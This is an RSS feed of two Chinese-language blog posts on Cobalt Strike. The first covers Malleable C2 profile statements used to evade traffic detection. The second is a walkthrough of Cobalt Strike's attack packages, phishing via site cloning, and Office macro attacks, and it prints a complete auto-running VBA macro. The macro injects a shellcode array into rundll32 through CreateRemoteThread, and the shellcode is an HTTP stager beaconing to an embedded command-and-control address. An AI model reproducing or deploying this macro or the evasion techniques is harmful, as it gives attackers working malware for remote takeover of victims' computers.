<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>CobaltStrike on Y4ph3tS blog</title>
    <link>https://yaphetszz.github.io/tags/cobaltstrike/</link>
    <description>Recent content in CobaltStrike on Y4ph3tS blog</description>
    <generator>Hugo</generator>
    <language>en</language>
    <lastBuildDate>Mon, 13 Apr 2020 15:18:36 +0800</lastBuildDate>
    <atom:link href="https://yaphetszz.github.io/tags/cobaltstrike/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>MalleableC2详解</title>
      <link>https://yaphetszz.github.io/posts/malleablec2%E8%AF%A6%E8%A7%A3/</link>
      <pubDate>Mon, 13 Apr 2020 15:18:36 +0800</pubDate>
      <guid>https://yaphetszz.github.io/posts/malleablec2%E8%AF%A6%E8%A7%A3/</guid>
      <description>&lt;h2 id=&#34;malleable-c2和malleable-pe&#34;&gt;malleable C2和Malleable PE&lt;/h2&gt;&#xA;&lt;p&gt;malleable C2 用于规避流量检测&lt;/p&gt;&#xA;&lt;p&gt;官网链接：https://www.cobaltstrike.com/help-malleable-c2&lt;/p&gt;&#xA;&lt;p&gt;需要考虑网络环境，根据目标网络编写Malleable C2 Profile&lt;/p&gt;&#xA;&lt;p&gt;C2的配置可包含以下部分&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Profile元素&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;global OPTIONS&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;https-certificate&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;code-signer&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;http-get&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;http-post&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;http-stager&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;post-ex&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;TCP Beacon&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&amp;hellip;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;在 Malleable C2 中, 语句可分为数据转换语句, 终止语句和额外语句三种类型。&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;数据转换语句：base64 base64url mask netbios netbiosu prepend append&#xD;&#xA;终止语句： print uri-append header parameter&#xD;&#xA;额外语句： header parameter&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;数据转换语句如下：&lt;/p&gt;&#xA;&lt;table&gt;&#xA;  &lt;thead&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;th&gt;声明方式&lt;/th&gt;&#xA;          &lt;th&gt;编码方式&lt;/th&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/thead&gt;&#xA;  &lt;tbody&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;append &amp;ldquo;string&amp;rdquo;&lt;/td&gt;&#xA;          &lt;td&gt;将指定字符串附加在末尾&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;base64&lt;/td&gt;&#xA;          &lt;td&gt;Base64编码&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;base64url&lt;/td&gt;&#xA;          &lt;td&gt;一种变异的Base64编码(这种编码后的数据不会含义破坏url完整性的字符如+号)&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;mask&lt;/td&gt;&#xA;          &lt;td&gt;XOR编码 key是随机的&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;netbios&lt;/td&gt;&#xA;          &lt;td&gt;NetBIOS Encode &amp;lsquo;a&amp;rsquo;&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;netbiosu&lt;/td&gt;&#xA;          &lt;td&gt;NetBIOS Encode &amp;lsquo;A&amp;rsquo;&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;/td&gt;&#xA;          &lt;td&gt;上面这种编码方式我也不怎么了解反正我只知道也是一种编码方式，有兴趣的自己谷歌一下吧&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;prepend &amp;ldquo;string&amp;rdquo;&lt;/td&gt;&#xA;          &lt;td&gt;将指定字符串附加在头部&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/tbody&gt;&#xA;&lt;/table&gt;&#xA;&lt;p&gt;Strings转义字符如下：&lt;/p&gt;</description>
    </item>
    <item>
      <title>CS基础和WEB Drive-by功能详解</title>
      <link>https://yaphetszz.github.io/posts/cs%E5%9F%BA%E7%A1%80%E5%92%8Cwebdrive-by%E5%8A%9F%E8%83%BD%E8%AF%A6%E8%A7%A3/</link>
      <pubDate>Mon, 02 Apr 2018 02:13:01 +0800</pubDate>
      <guid>https://yaphetszz.github.io/posts/cs%E5%9F%BA%E7%A1%80%E5%92%8Cwebdrive-by%E5%8A%9F%E8%83%BD%E8%AF%A6%E8%A7%A3/</guid>
      <description>&lt;h2 id=&#34;cs基础&#34;&gt;CS基础&lt;/h2&gt;&#xA;&lt;p&gt;CS服务端启动方式&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./teamserver ip password&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Attacks-Packages:&lt;/p&gt;&#xA;&lt;p&gt;HTML Application生成恶意HTA木马&lt;/p&gt;&#xA;&lt;p&gt;MS Office Macro生成office宏病毒&lt;/p&gt;&#xA;&lt;p&gt;Payload Generator生成各种语言版本的payload&lt;/p&gt;&#xA;&lt;p&gt;USB/CD Autoplay 生成利用自动播放运行的木马&lt;/p&gt;&#xA;&lt;p&gt;Windows Dropper捆绑器，对文档类进行捆绑&lt;/p&gt;&#xA;&lt;p&gt;Windows Executable 生成可执行exe木马&lt;/p&gt;&#xA;&lt;p&gt;Windows Executable(S)生成无状态的exe木马&lt;/p&gt;&#xA;&lt;p&gt;Attacks-Web Drive-by&lt;/p&gt;&#xA;&lt;p&gt;Manage对开启的web服务进行管理&lt;/p&gt;&#xA;&lt;p&gt;Clone Site克隆网站，可记录受害者提交数据&lt;/p&gt;&#xA;&lt;p&gt;Host File 提供文件下载，可修改Mime信息&lt;/p&gt;&#xA;&lt;p&gt;Powershell Web Delivery类似MSF的WEB_delivery&lt;/p&gt;&#xA;&lt;p&gt;signed applet attack 使用java自签名程序进行钓鱼&lt;/p&gt;&#xA;&lt;p&gt;Smart Applet Attack自动检测Java版本并进行攻击，针对Java1.6.0_45以下以及1.7.0_21以下版本&lt;/p&gt;&#xA;&lt;p&gt;System Profiler用来获取系统信息，如系统版本，Flash版本，浏览器版本等&lt;/p&gt;&#xA;&lt;p&gt;生成对应木马目标执行后就会上线&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/2fdf5b6a-65b6-4888-9e9b-70f624fefead.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;可以浏览文件，收集内网信息等，但是相比于MSF反应略慢，所以有时候需要MSF和CS联动&lt;/p&gt;&#xA;&lt;h2 id=&#34;cs使用office宏进行攻击&#34;&gt;CS使用office宏进行攻击&lt;/h2&gt;&#xA;&lt;p&gt;新建一个office监听器&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/63c98e4d-e674-4a25-a25e-2876033e8076.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;点击生成宏后选择监听器&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/3f82cbe3-a538-43c0-ac0a-8c0b74806e3a.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;宏代码会自动加载，需要自己点击复制然后创建宏&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/f89def44-eefc-43c7-9dac-f3b8ffaba382.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;默认生成的宏代码如下，该代码并没有做免杀，基本都会直接被杀掉&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-vbscript&#34; data-lang=&#34;vbscript&#34;&gt;Private Type PROCESS_INFORMATION&#xD;&#xA;    hProcess As Long&#xD;&#xA;    hThread As Long&#xD;&#xA;    dwProcessId As Long&#xD;&#xA;    dwThreadId As Long&#xD;&#xA;End Type&#xD;&#xA;Private Type STARTUPINFO&#xD;&#xA;    cb As Long&#xD;&#xA;    lpReserved As String&#xD;&#xA;    lpDesktop As String&#xD;&#xA;    lpTitle As String&#xD;&#xA;    dwX As Long&#xD;&#xA;    dwY As Long&#xD;&#xA;    dwXSize As Long&#xD;&#xA;    dwYSize As Long&#xD;&#xA;    dwXCountChars As Long&#xD;&#xA;    dwYCountChars As Long&#xD;&#xA;    dwFillAttribute As Long&#xD;&#xA;    dwFlags As Long&#xD;&#xA;    wShowWindow As Integer&#xD;&#xA;    cbReserved2 As Integer&#xD;&#xA;    lpReserved2 As Long&#xD;&#xA;    hStdInput As Long&#xD;&#xA;    hStdOutput As Long&#xD;&#xA;    hStdError As Long&#xD;&#xA;End Type&#xD;&#xA;#If VBA7 Then&#xD;&#xA;    Private Declare PtrSafe Function CreateStuff Lib &amp;#34;kernel32&amp;#34; Alias &amp;#34;CreateRemoteThread&amp;#34; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr&#xD;&#xA;    Private Declare PtrSafe Function AllocStuff Lib &amp;#34;kernel32&amp;#34; Alias &amp;#34;VirtualAllocEx&amp;#34; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr&#xD;&#xA;    Private Declare PtrSafe Function WriteStuff Lib &amp;#34;kernel32&amp;#34; Alias &amp;#34;WriteProcessMemory&amp;#34; (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtr&#xD;&#xA;    Private Declare PtrSafe Function RunStuff Lib &amp;#34;kernel32&amp;#34; Alias &amp;#34;CreateProcessA&amp;#34; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long&#xD;&#xA;#Else&#xD;&#xA;    Private Declare Function CreateStuff Lib &amp;#34;kernel32&amp;#34; Alias &amp;#34;CreateRemoteThread&amp;#34; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long&#xD;&#xA;    Private Declare Function AllocStuff Lib &amp;#34;kernel32&amp;#34; Alias &amp;#34;VirtualAllocEx&amp;#34; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long&#xD;&#xA;    Private Declare Function WriteStuff Lib &amp;#34;kernel32&amp;#34; Alias &amp;#34;WriteProcessMemory&amp;#34; (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As Long&#xD;&#xA;    Private Declare Function RunStuff Lib &amp;#34;kernel32&amp;#34; Alias &amp;#34;CreateProcessA&amp;#34; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long&#xD;&#xA;#End If&#xD;&#xA;Sub Auto_Open()&#xD;&#xA;    Dim myByte As Long, myArray As Variant, offset As Long&#xD;&#xA;    Dim pInfo As PROCESS_INFORMATION&#xD;&#xA;    Dim sInfo As STARTUPINFO&#xD;&#xA;    Dim sNull As String&#xD;&#xA;    Dim sProc As String&#xD;&#xA;#If VBA7 Then&#xD;&#xA;    Dim rwxpage As LongPtr, res As LongPtr&#xD;&#xA;#Else&#xD;&#xA;    Dim rwxpage As Long, res As Long&#xD;&#xA;#End If&#xD;&#xA;    myArray = Array(-4,-24,-119,0,0,0,96,-119,-27,49,-46,100,-117,82,48,-117,82,12,-117,82,20,-117,114,40,15,-73,74,38,49,-1,49,-64,-84, _&#xD;&#xA;60,97,124,2,44,32,-63,-49,13,1,-57,-30,-16,82,87,-117,82,16,-117,66,60,1,-48,-117,64,120,-123,-64,116,74,1,-48, _&#xD;&#xA;80,-117,72,24,-117,88,32,1,-45,-29,60,73,-117,52,-117,1,-42,49,-1,49,-64,-84,-63,-49,13,1,-57,56,-32,117,-12,3, _&#xD;&#xA;125,-8,59,125,36,117,-30,88,-117,88,36,1,-45,102,-117,12,75,-117,88,28,1,-45,-117,4,-117,1,-48,-119,68,36,36,91, _&#xD;&#xA;91,97,89,90,81,-1,-32,88,95,90,-117,18,-21,-122,93,104,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,-1, _&#xD;&#xA;-43,-24,-128,0,0,0,77,111,122,105,108,108,97,47,53,46,48,32,40,99,111,109,112,97,116,105,98,108,101,59,32,77, _&#xD;&#xA;83,73,69,32,57,46,48,59,32,87,105,110,100,111,119,115,32,78,84,32,54,46,49,59,32,84,114,105,100,101,110,116, _&#xD;&#xA;47,53,46,48,59,32,76,66,66,82,79,87,83,69,82,41,0,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88, _&#xD;&#xA;88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88, _&#xD;&#xA;88,88,88,88,88,0,89,49,-1,87,87,87,87,81,104,58,86,121,-89,-1,-43,-21,121,91,49,-55,81,81,106,3,81,81, _&#xD;&#xA;104,-72,34,0,0,83,80,104,87,-119,-97,-58,-1,-43,-21,98,89,49,-46,82,104,0,2,96,-124,82,82,82,81,82,80,104, _&#xD;&#xA;-21,85,46,59,-1,-43,-119,-58,49,-1,87,87,87,87,86,104,45,6,24,123,-1,-43,-123,-64,116,68,49,-1,-123,-10,116,4, _&#xD;&#xA;-119,-7,-21,9,104,-86,-59,-30,93,-1,-43,-119,-63,104,69,33,94,49,-1,-43,49,-1,87,106,7,81,86,80,104,-73,87,-32, _&#xD;&#xA;11,-1,-43,-65,0,47,0,0,57,-57,116,-68,49,-1,-21,21,-21,73,-24,-103,-1,-1,-1,47,53,100,120,75,0,0,104,-16, _&#xD;&#xA;-75,-94,86,-1,-43,106,64,104,0,16,0,0,104,0,0,64,0,87,104,88,-92,83,-27,-1,-43,-109,83,83,-119,-25,87,104, _&#xD;&#xA;0,32,0,0,83,86,104,18,-106,-119,-30,-1,-43,-123,-64,116,-51,-117,7,1,-61,-123,-64,117,-27,88,-61,-24,55,-1,-1,-1, _&#xD;&#xA;49,55,50,46,49,54,46,49,50,46,49,50,57,0)&#xD;&#xA;    If Len(Environ(&amp;#34;ProgramW6432&amp;#34;)) &amp;gt; 0 Then&#xD;&#xA;        sProc = Environ(&amp;#34;windir&amp;#34;) &amp;amp; &amp;#34;\\SysWOW64\\rundll32.exe&amp;#34;&#xD;&#xA;    Else&#xD;&#xA;        sProc = Environ(&amp;#34;windir&amp;#34;) &amp;amp; &amp;#34;\\System32\\rundll32.exe&amp;#34;&#xD;&#xA;    End If&#xD;&#xA;    res = RunStuff(sNull, sProc, ByVal 0&amp;amp;, ByVal 0&amp;amp;, ByVal 1&amp;amp;, ByVal 4&amp;amp;, ByVal 0&amp;amp;, sNull, sInfo, pInfo)&#xD;&#xA;    rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &amp;amp;H1000, &amp;amp;H40)&#xD;&#xA;    For offset = LBound(myArray) To UBound(myArray)&#xD;&#xA;        myByte = myArray(offset)&#xD;&#xA;        res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&amp;amp;)&#xD;&#xA;    Next offset&#xD;&#xA;    res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)&#xD;&#xA;End Sub&#xD;&#xA;Sub AutoOpen()&#xD;&#xA;    Auto_Open&#xD;&#xA;End Sub&#xD;&#xA;Sub Workbook_Open()&#xD;&#xA;    Auto_Open&#xD;&#xA;End Sub&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;将这串代码复制到WORD或者其他office中进行创建宏&lt;/p&gt;</description>
    </item>
  </channel>
</rss>
